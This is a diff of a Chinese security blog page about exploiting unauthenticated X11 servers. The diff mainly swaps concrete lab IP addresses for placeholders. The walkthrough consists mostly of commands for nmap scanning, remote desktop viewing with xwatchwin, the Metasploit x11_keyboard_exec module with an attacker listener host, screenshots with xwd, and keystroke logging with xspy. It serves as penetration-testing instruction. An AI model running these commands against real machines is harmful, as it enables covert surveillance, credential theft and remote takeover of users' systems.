@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="x11服务器未正确配置造成未授权访问">
+<meta name="description" content="Nessus扫描器扫到的一个x11的漏洞">
 <meta name="keywords" content="扫描">
 <meta property="og:type" content="article">
 <meta property="og:title" content="x-server未授权访问">
 <meta property="og:url" content="https://magua.online/archives/6f65211d.html">
 <meta property="og:site_name" content="妄">
-<meta property="og:description" content="x11服务器未正确配置造成未授权访问">
+<meta property="og:description" content="Nessus扫描器扫到的一个x11的漏洞">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-04T13:27:33.777Z">
+<meta property="og:updated_time" content="2018-09-04T13:39:50.634Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="x-server未授权访问">
-<meta name="twitter:description" content="x11服务器未正确配置造成未授权访问">
+<meta name="twitter:description" content="Nessus扫描器扫到的一个x11的漏洞">
 
 
 
@@ -307,15 +307,15 @@
       
 
       
-        <p>x11服务器未正确配置造成未授权访问<br><a id="more"></a></p>
+        <p>Nessus扫描器扫到的一个x11的漏洞<br><a id="more"></a></p>
 <p>参考链接：<a href="https://zachgrace.com/training/x11/" target="_blank" rel="noopener">https://zachgrace.com/training/x11/</a></p>
 <h1 id="0x01-安装工具-xwatchwin"><a href="#0x01-安装工具-xwatchwin" class="headerlink" title="0x01 安装工具-xwatchwin"></a>0x01 安装工具-xwatchwin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz</span><br><span class="line">tar zxvf xwatchwin.tar.gz</span><br><span class="line">cd xwatchwin/</span><br><span class="line">xmkmf &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-<p>X11通常在端口6000-60063上运行，但最常见的是端口6000-6002。我们可以使用Nmap来扫描和识别X11。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -n -v -p 6000-6002 192.168.100.123</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">6000/tcp open   X11    X.Org (open)</span><br><span class="line">6001/tcp closed X11:1</span><br><span class="line">6002/tcp closed X11:2</span><br><span class="line">MAC Address: 08:00:27:1A:F3:00 (Cadmus Computer Systems)</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure></p>
-<p>要观看显示，您可以使用xwatchwin使用root窗口标识来观看特定窗口或整个桌面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xwatchwin# xwatchwin -u 0.5 IP ADDRESS:0 root</span><br></pre></td></tr></table></figure></p>
-<h1 id="0x02-msf"><a href="#0x02-msf" class="headerlink" title="0x02 msf"></a>0x02 msf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/x11/x11_keyboard_exec</span><br><span class="line">set rhost 192.168.100.123</span><br><span class="line">set lhost 192.168.100.101</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>xwininfo收集信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xwininfo -root -tree -display 192.168.100.123:0</span><br></pre></td></tr></table></figure></p>
-<p>xwd工具可用于创建远程桌面的屏幕截图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xwd -root -screen -silent -display 192.168.100.123:0 &gt; screenshot.xwd</span><br><span class="line">convert screenshot.xwd screenshot.png</span><br></pre></td></tr></table></figure></p>
-<p>xspy工具可进行按键记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xspy</span><br><span class="line">opened 192.168.100.123:0 for snoopng</span><br><span class="line">test</span><br></pre></td></tr></table></figure></p>
+<p>X11通常在端口6000-60063上运行，但最常见的是端口6000-6002。我们可以使用Nmap来扫描和识别X11。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -n -v -p 6000-6002 IP_ADDRESS</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">6000/tcp open   X11    X.Org (open)</span><br><span class="line">6001/tcp closed X11:1</span><br><span class="line">6002/tcp closed X11:2</span><br><span class="line">MAC Address: 08:00:27:1A:F3:00 (Cadmus Computer Systems)</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure></p>
+<p>要观看显示，您可以使用xwatchwin使用root窗口标识来观看特定窗口或整个桌面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xwatchwin# xwatchwin -u 0.5 IP_ADDRESS:0 root</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x02-msf"><a href="#0x02-msf" class="headerlink" title="0x02 msf"></a>0x02 msf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/x11/x11_keyboard_exec</span><br><span class="line">set rhost IP_ADDRESS</span><br><span class="line">set lhost IP_ADDRESS1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>xwininfo收集信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xwininfo -root -tree -display IP_ADDRESS:0</span><br></pre></td></tr></table></figure></p>
+<p>xwd工具可用于创建远程桌面的屏幕截图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xwd -root -screen -silent -display IP_ADDRESS:0 &gt; screenshot.xwd</span><br><span class="line">convert screenshot.xwd screenshot.png</span><br></pre></td></tr></table></figure></p>
+<p>xspy工具可进行按键记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xspy</span><br><span class="line">opened IP_ADDRESS:0 for snoopng</span><br><span class="line">test</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
